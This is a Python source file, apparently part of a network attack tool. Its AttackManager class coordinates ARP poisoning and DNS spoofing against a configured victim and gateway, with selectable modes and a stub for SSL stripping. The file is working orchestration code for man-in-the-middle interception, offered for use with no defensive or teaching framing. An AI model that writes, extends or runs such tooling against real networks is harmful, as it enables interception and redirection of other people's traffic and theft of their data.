"""
Attack Manager module for coordinating multiple attack components.

This module manages the lifecycle of all attack modules (ARP poisoning,
DNS spoofing, SSL stripping) and provides a unified interface for
starting, stopping, and monitoring attacks.
"""

from __future__ import annotations

import signal
import time
from dataclasses import dataclass
from enum import Enum
from types import FrameType
from typing import Any, Callable

import click

from arp_poisoner import ARPPoisoner
from dns_spoofer import DNSSpoofer, DNSMode

class AttackMode(Enum):
    """Available attack modes."""

    ARP_ONLY = "arp-only"
    DNS_ONLY = "dns-only"
    ARP_DNS = "arp-dns"
    ARP_SSL = "arp-ssl"
    ARP_DNS_SSL = "arp-dns-ssl"


@dataclass
class AttackConfig:
    """Configuration for an attack session."""

    mode: AttackMode
    iface: str
    attacker_ip: str
    victim_ip: str
    gateway_ip: str
    dns_rules: dict[str, str] | None = None
    arp_interval: float = 2.0
    silent: bool = False


class AttackManager:
    """Coordinates attack modules based on the selected mode."""

    def __init__(
        self,
        config: AttackConfig,
    ):
        self.config = config

        self._arp_poisoner: ARPPoisoner | None = None
        self._dns_spoofer: DNSSpoofer | None = None
        # TO DO: ssl init

        self._running = False
        self._original_sigint: Callable[[int, FrameType | None], Any] | int | None = None

    def _setup_signal_handlers(self) -> None:
        self._original_sigint = signal.getsignal(signal.SIGINT)

        def handler(_signum, _frame):
            click.echo("\n[!] Interrupt received, stopping attack...")
            self.stop()

        signal.signal(signal.SIGINT, handler)

    def _restore_signal_handlers(self) -> None:
        if self._original_sigint:
            signal.signal(signal.SIGINT, self._original_sigint)

    def start(self) -> None:
        """Start the attack based on configured mode."""
        if self._running:
            click.echo("[*] Attack already running.")
            return

        self._running = True
        mode = self.config.mode

        click.echo(f"[+] Starting attack in {mode.value} mode")
        click.echo(f"[+] Target: {self.config.victim_ip} <-> {self.config.gateway_ip}")

        try:
            needs_arp = mode in (
                AttackMode.ARP_ONLY,
                AttackMode.ARP_DNS,
                AttackMode.ARP_SSL,
                AttackMode.ARP_DNS_SSL,
            )
            needs_dns = mode in (
                AttackMode.DNS_ONLY,
                AttackMode.ARP_DNS,
                AttackMode.ARP_DNS_SSL,
            )
            needs_ssl = mode in (
                AttackMode.ARP_SSL,
                AttackMode.ARP_DNS_SSL,
            )

            if needs_arp:
                click.echo("[*] Initializing ARP poisoner...")
                arp_mode = "silent" if self.config.silent else "all-out"
                click.echo(f"[*] ARP mode: {arp_mode}")
                self._arp_poisoner = ARPPoisoner(
                    iface=self.config.iface,
                    victim_ip=self.config.victim_ip,
                    target_ip=self.config.gateway_ip,
                    interval=self.config.arp_interval,
                    silent=self.config.silent,
                )
                self._arp_poisoner.start()

                if mode != AttackMode.ARP_ONLY:
                    time.sleep(1)  # Give ARP time to poison

            if needs_dns:
                if not self.config.dns_rules:
                    raise ValueError("DNS rules required for DNS spoofing modes")

                dns_mode = DNSMode.RACE if mode == AttackMode.DNS_ONLY else DNSMode.MITM
                click.echo(f"[*] Initializing DNS spoofer in {dns_mode.value} mode...")
                self._dns_spoofer = DNSSpoofer(
                    iface=self.config.iface,
                    rules=self.config.dns_rules,
                    mode=dns_mode,
                    victim_ip=self.config.victim_ip,
                    gateway_ip=self.config.gateway_ip,  # Needed for iptables rules in MITM mode
                )
                self._dns_spoofer.start()

            # TO DO
            #if needs_ssl:

            click.echo("[+] Attack started successfully")
            click.echo("[+] Press Ctrl+C to stop")

        except Exception as e:
            click.echo(f"[!] Error starting attack: {e}")
            self.stop()
            raise

    def stop(self) -> None:
        """Stop all running attack modules."""
        if not self._running:
            return

        click.echo("[*] Stopping all attack modules...")
        self._running = False

        if self._dns_spoofer:
            self._dns_spoofer.stop()

        if self._arp_poisoner:
            self._arp_poisoner.stop()

        if self._dns_spoofer:
            self._dns_spoofer.join(timeout=5.0)

        if self._arp_poisoner:
            self._arp_poisoner.join(timeout=5.0)

        click.echo("[+] All attack modules stopped")

    def is_running(self) -> bool:
        return self._running

    def wait(self) -> None:
        """Wait for attack to complete (blocking)."""
        self._setup_signal_handlers()

        try:
            while self._running:
                time.sleep(0.5)
        finally:
            self._restore_signal_handlers()
